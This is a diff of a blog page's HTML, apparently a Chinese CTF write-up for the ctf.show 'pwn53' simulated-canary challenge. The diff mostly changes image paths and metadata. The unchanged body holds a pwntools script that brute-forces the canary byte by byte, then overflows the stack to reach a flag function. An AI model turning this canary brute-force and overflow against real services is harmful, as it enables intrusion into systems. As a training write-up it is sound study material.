@@ -29,15 +29,15 @@
 <meta property="og:site_name" content="网络幻影">
 <meta property="og:description" content="先用IDA打开发现有canary函数   为什么要比较呢；应为如果我们利用栈溢出改了s1的部分，到了比较的部分就会退出程序。   ​       可以看到我们可以利用这个判断爆破出canary,找到canary后利用栈溢出执行flag函数就可以了​       python ​       from pwn import * ​       from LibcSearcher import *">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://linkpwn.github.io/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/1.png">
-<meta property="og:image" content="http://linkpwn.github.io/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/2.png">
-<meta property="og:image" content="http://linkpwn.github.io/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/3.png">
+<meta property="og:image" content="http://linkpwn.github.io/pwn53-%E6%A8%A1%E6%8B%9Fcanary/1.png">
+<meta property="og:image" content="http://linkpwn.github.io/pwn53-%E6%A8%A1%E6%8B%9Fcanary/2.png">
+<meta property="og:image" content="http://linkpwn.github.io/pwn53-%E6%A8%A1%E6%8B%9Fcanary/3.png">
 <meta property="article:published_time" content="2025-02-28T01:00:16.000Z">
-<meta property="article:modified_time" content="2025-09-23T12:48:27.433Z">
+<meta property="article:modified_time" content="2025-09-23T12:48:27.000Z">
 <meta property="article:author" content="linkpwn">
-<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta property="article:tag" content="ctf学习, 编程学习, 游戏, 日常">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://linkpwn.github.io/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/1.png">
+<meta name="twitter:image" content="http://linkpwn.github.io/pwn53-%E6%A8%A1%E6%8B%9Fcanary/1.png">
 
 <link rel="canonical" href="http://linkpwn.github.io/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/">
 
@@ -106,7 +106,7 @@
       <h1 class="site-title">网络幻影</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <p class="site-subtitle" itemprop="description">linkpwn</p>
       <a>
         <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
       </a>
@@ -200,7 +200,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -265,13 +265,13 @@
       
         <ol>
 <li><p>先用IDA打开发现有canary函数</p>
-<p><img src="/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/1.png" alt="1"></p>
+<p><img src="/./pwn53-%E6%A8%A1%E6%8B%9Fcanary/1.png" alt="1"></p>
 </li>
-<li><p>为什么要比较呢；应为如果我们利用栈溢出改了s1的部分，到了比较的部分就会退出程序。<br><img src="/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/2.png" alt="2"></p>
+<li><p>为什么要比较呢；应为如果我们利用栈溢出改了s1的部分，到了比较的部分就会退出程序。<br><img src="/./pwn53-%E6%A8%A1%E6%8B%9Fcanary/2.png" alt="2"></p>
 </li>
 </ol>
 <p>​       可以看到我们可以利用这个判断爆破出canary,找到canary后利用栈溢出执行flag函数就可以了<br>​       <code>python ​       from pwn import * ​       from LibcSearcher import * ​       #context.log_level = &#39;debug&#39; ​       #context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;) ​       canary=b&#39;&#39; ​       for i in range(4): ​           for j in range(0x1000): ​               r=remote(&quot;pwn.challenge.ctf.show&quot;, 28145) ​               flag=0x08048696 ​               r.sendlineafter(&quot;How many bytes do you want to write to the buffer?\n&gt;&quot;,&#39;999&#39;) ​               r.recv() ​        ​               payload1=b&quot;I&quot;*(0x20)+canary+p8(j)#+b&quot;a&quot;*16+p32(flag)#+p32(0)+p32(876)+p32(877)#+p32(system) ​               r.send(payload1) ​                       a=r.recv()                if b&#39;Canary Value Incorrect!&#39; not in a: #不输出这个字符串代表该字符匹配成功                    canary+=p8(j) #将匹配字节加入到后面（canary j  的顺序）                    print(canary)                    break                else:                    print(&quot;gg&quot;)                r.close()        r = remote(&quot;pwn.challenge.ctf.show&quot;,28145)        flag=0x08048696        r.sendlineafter(&quot;How many bytes do you want to write to the buffer?\n&gt;&quot;,&#39;999&#39;)        print(canary)        payload1=b&quot;I&quot;*(0x20)+canary+b&quot;a&quot;*16+p32(flag)        r.recvuntil(&quot;$&quot;)        r.send(payload1)        r.recv()        r.interactive()       </code></p>
-<p><img src="/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/3.png" alt="3"></p>
+<p><img src="/./pwn53-%E6%A8%A1%E6%8B%9Fcanary/3.png" alt="3"></p>
 
     </div>
 
@@ -377,7 +377,7 @@
     <img class="site-author-image" itemprop="image" alt="linkpwn"
       src="/images/avatar.jpg">
   <p class="site-author-name" itemprop="name">linkpwn</p>
-  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+  <div class="site-description" itemprop="description">linkpwn的学习记录</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
